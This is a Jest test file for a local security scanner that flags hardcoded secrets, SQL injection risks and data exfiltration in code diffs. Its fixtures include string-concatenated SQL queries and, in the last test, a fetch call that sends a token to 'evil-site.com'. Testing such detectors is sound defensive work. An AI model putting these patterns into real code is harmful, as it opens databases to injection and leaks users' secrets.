const { scanSecurityPatterns } = require("../services/localSecurityScanner");

describe("local security scanner", () => {
  test("should return empty array for empty input", () => {
    const findings = scanSecurityPatterns("");

    expect(findings).toEqual([]);
  });

  test("should detect hardcoded API key", () => {
    const diff = `
      const apiKey = "abc123-secret-key";
    `;

    const findings = scanSecurityPatterns(diff);

    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0]).toMatchObject({
      issueType: "Hardcoded API Key",
      riskLevel: "High",
    });
  });

  test("should detect hardcoded password", () => {
    const diff = `
      const password = "myPassword123";
    `;

    const findings = scanSecurityPatterns(diff);

    expect(findings.some((finding) => finding.issueType === "Hardcoded Password")).toBe(true);
  });

  test("should detect hardcoded token", () => {
    const diff = `
      const token = "ghp_testTokenValue123";
    `;

    const findings = scanSecurityPatterns(diff);

    expect(findings.some((finding) => finding.issueType === "Hardcoded Token")).toBe(true);
  });

  test("should detect AWS access key", () => {
    const diff = `
      const awsKey = "AKIA1234567890ABCDEF";
    `;

    const findings = scanSecurityPatterns(diff);

    expect(findings.some((finding) => finding.issueType === "AWS Access Key")).toBe(true);
  });

  test("should detect private key", () => {
    const diff = `
      -----BEGIN PRIVATE KEY-----
      abcdefg
      -----END PRIVATE KEY-----
    `;

    const findings = scanSecurityPatterns(diff);

    expect(findings.some((finding) => finding.issueType === "Private Key Exposure")).toBe(true);
  });

  test("should detect SQL injection risk", () => {
    const diff = `
      const query = "SELECT * FROM users WHERE id = " + userId;
    `;

    const findings = scanSecurityPatterns(diff);

    expect(findings.some((finding) => finding.issueType === "SQL Injection Risk")).toBe(true);
  });

  test("should detect unsafe SQL string concatenation", () => {
    const diff = `
      db.query("SELECT * FROM users WHERE email = '" + email + "'");
    `;

    const findings = scanSecurityPatterns(diff);

    expect(findings.some((finding) => finding.issueType === "Unsafe SQL String Concatenation")).toBe(true);
  });

  test("each finding should include issue type, risk level, explanation, and suggested fix", () => {
    const diff = `
      const password = "secret123";
    `;

    const findings = scanSecurityPatterns(diff);

    expect(findings[0]).toHaveProperty("issueType");
    expect(findings[0]).toHaveProperty("riskLevel");
    expect(findings[0]).toHaveProperty("explanation");
    expect(findings[0]).toHaveProperty("suggestedFix");
  });

  test("should detect suspicious data exfiltration", () => {
    const diff = `
    fetch("https://evil-site.com/steal?token=" + token);
  `;

    const findings = scanSecurityPatterns(diff);

    expect(
      findings.some(
        (finding) => finding.issueType === "Suspicious Data Exfiltration"
      )
    ).toBe(true);
  });
});